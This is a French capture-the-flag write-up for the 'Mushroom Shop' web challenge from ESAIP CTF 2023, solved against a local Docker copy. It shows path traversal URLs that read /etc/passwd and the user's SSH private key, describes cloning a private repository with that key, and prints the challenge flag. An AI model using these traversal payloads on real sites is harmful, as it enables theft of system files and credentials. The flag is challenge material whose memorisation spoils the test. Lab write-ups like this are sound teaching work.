# The Mushroom Shop

**Category** : World 2
**Points** : 400

Mario has decided to create his online mushrooms store.

Before the official launch he would like to make sure that his website is secure.

https://mushroom-shop.esaip-cyber.com/

**Author: Osy_Ris**


**Les liens ne sont pas ceux utilisé durant le CTF, pour faire le writeups j'ai utilisé le docker file fournit ici : https://github.com/ESAIP-CTF/public-esaip-ctf-2023/tree/master/challenges/web/the_mushroom_shop** 

Après une analyse du site on découvre un faille qui nous permet de lire le fichier /etc/passwd : 

http://127.0.0.1/?page=../../../../../../etc/passwd

nous découvrons l'utilisateur User :
```
User,,,:/home/mario:/bin/ash
```
On recherche son activité via : 

```
cd ls -al cd /var/www/html/ 
git clone git@github.com:MarioMushroomShop/MyMushroomShop.git 
rm -rf /var/www/html/.git exit
```

On a donc l'info qu'il a utilisé la commande git pour récupérer son projet et cela via ssh

en tentant d'aller sur le projet, celui-ci n'est pas ouvert au public

recherche de la clef privé de mario via : 
http://127.0.0.1/?page=../../../../../../home/mario/.ssh/id_rsa

puis en clonant le repos en utilisant cette clef , on trouve dans les source du projet le flag : 

le flag : ```ECTF{taK3_c4re_0F_Y0Ur_PRIV4t3_REPos}```
